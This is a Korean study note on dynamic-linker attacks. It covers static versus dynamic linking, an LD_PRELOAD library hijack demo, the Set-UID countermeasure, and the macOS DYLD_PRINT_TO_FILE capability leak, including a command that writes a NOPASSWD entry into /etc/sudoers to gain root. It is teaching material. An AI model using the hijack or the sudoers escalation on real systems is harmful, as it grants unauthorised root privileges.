## Attacks via Dynamic Linker 완전 정리

---

### 1. 링킹(Linking)이란?

프로그램이 `printf()`, `sleep()` 같은 **외부 라이브러리 함수를 찾는 과정**입니다.

링킹 방식은 두 가지입니다.

---

### 2. Static Linking vs Dynamic Linking

#### Static Linking

```
컴파일 시점에 라이브러리 코드를 실행파일 안에 통째로 집어넣음
```

bash

```bash
gcc -static -o hello_static hello.c  # 751,294 bytes
gcc         -o hello_dynamic hello.c #   7,162 bytes
```

**Static이 100배 더 큰 이유** → `printf()` 구현 코드가 실행파일 안에 다 들어있기 때문

장단점:

- ✅ 외부 라이브러리 영향 없음 → 공격 불가
- ❌ 파일 크기가 매우 큼

---

#### Dynamic Linking

```
실행 시점(runtime)에 라이브러리를 찾아서 연결
```

실행 흐름:

```
실행파일 (Partially Linked)
        ↓
    Loader (execve)  ← 실행파일을 메모리에 올림
        ↓
Dynamic Linker (ld.so)  ← 환경변수 참조해서 라이브러리 연결
        ↓
    Jump to main()  ← 완전히 링크된 상태로 실행
```

`ldd` 명령어로 의존 라이브러리 확인 가능:

bash

```bash
ldd hello_static
→ not a dynamic executable  # 의존 없음

ldd hello_dynamic
→ libc.so.6      # printf(), sleep() 등 포함
→ ld-linux.so.2  # Dynamic Linker 자체
→ linux-gate.so.1  # 시스템 콜용
```

---

### 3. Dynamic Linking의 위험성

Dynamic Linker는 **환경변수를 참조**해서 라이브러리를 찾습니다.

```
환경변수를 사용자가 조작할 수 있다
        ↓
어떤 라이브러리를 로드할지 공격자가 제어 가능
        ↓
라이브러리 함수 하이재킹!
```

---

### 4. Case Study 1: LD_PRELOAD 공격

#### 핵심 개념

|환경변수|역할|
|---|---|
|`LD_PRELOAD`|여기 지정된 라이브러리를 **가장 먼저** 탐색|
|`LD_LIBRARY_PATH`|LD_PRELOAD에서 못 찾으면 **이 경로**에서 탐색|

#### 공격 흐름

**준비물:**

`mytest.c` (피해 프로그램)

c

```c
int main() {
    sleep(1);   // 시스템 sleep()을 호출하려 함
    return 0;
}
```

`sleep.c` (가짜 라이브러리)

c

```c
void sleep(int s) {
    printf("I am not sleeping!\n");  // 가짜 sleep
}
```

**공격 실행:**

bash

```bash
gcc -c sleep.c                          # sleep.o 생성
gcc -shared -o libmylib.so.1.0.1 sleep.o  # 공유 라이브러리 생성
export LD_PRELOAD=./libmylib.so.1.0.1   # 내 라이브러리를 먼저 탐색하게 설정
./mytest
→ "I am not sleeping!"  # 가짜 sleep()이 실행됨!
```

---

#### Example 2: Set-UID 프로그램에 시도하면?

bash

```bash
sudo chown root mytest
sudo chmod 4755 mytest   # Set-UID 설정 (-rwsr-xr-x)
export LD_PRELOAD=./libmylib.so.1.0.1
./mytest
→ (아무 출력 없음)  # 공격 실패!
```

**왜 실패?**

> **EUID(유효 사용자 ID) ≠ RUID(실제 사용자 ID)** 일 때, Dynamic Linker가 자동으로 `LD_PRELOAD`, `LD_LIBRARY_PATH`를 **무시**합니다.

```
일반 실행:  RUID=seed, EUID=seed  → 같음 → LD_PRELOAD 적용
Set-UID:   RUID=seed, EUID=root  → 다름 → LD_PRELOAD 무시!
```

---

#### Countermeasure 검증 (env 실험)

bash

```bash
cp /usr/bin/env ./myenv
sudo chown root myenv
sudo chmod 4755 myenv       # myenv를 Set-UID로 만들기

export LD_PRELOAD=./libmylib.so.1.0.1
export LD_LIBRARY_PATH=.
export LD_MYOWN="my own value"

env | grep LD_              # 일반 프로그램 실행
→ LD_PRELOAD=./libmylib.so.1.0.1  # 모두 보임
→ LD_LIBRARY_PATH=.
→ LD_MYOWN=my own value

myenv | grep LD_            # Set-UID 프로그램 실행
→ LD_MYOWN=my own value     # LD_ 위험 변수만 사라짐!
```

**결론:** Set-UID 프로그램은 `LD_PRELOAD`, `LD_LIBRARY_PATH`를 자동 제거합니다. `LD_MYOWN`처럼 라이브러리 로딩과 무관한 변수는 유지됩니다.

### 5. Case Study 2: OS X DYLD_PRINT_TO_FILE 취약점

macOS 10.10에서 발생한 실제 취약점입니다.

**`DYLD_PRINT_TO_FILE`** = dyld(macOS의 Dynamic Linker)가 로그를 출력할 파일 경로 지정
[[dyld 상세]]

**문제점:**

- Set-UID 프로그램에서도 이 변수를 무시하지 않음
- **파일 디스크립터가 닫히지 않음 (Capability Leak)**
- → root 권한으로 보호된 파일에 쓰기 가능!

**공격 예시:**

bash

```bash
DYLD_PRINT_TO_FILE=/etc/sudoers  # sudoers 파일을 로그 출력 대상으로 지정
su bob
echo "bob ALL=(ALL) NOPASSWD:ALL" >&3  # bob에게 root 권한 부여!
```

`/etc/sudoers`는 원래 root만 수정 가능하지만, Capability Leak으로 일반 유저가 **sudo 권한을 스스로 부여**할 수 있게 됩니다.

---

### 전체 요약

```
Dynamic Linking
→ 환경변수(LD_PRELOAD 등)로 라이브러리 탐색 경로 제어 가능
→ 공격자가 가짜 라이브러리로 함수 하이재킹 가능

대응책 (리눅스)
→ EUID ≠ RUID 이면 LD_PRELOAD, LD_LIBRARY_PATH 자동 무시

실제 사례 (macOS)
→ DYLD_PRINT_TO_FILE은 Set-UID에서도 차단 안 됨
→ Capability Leak으로 보호 파일 쓰기 가능 → 권한 상승
```
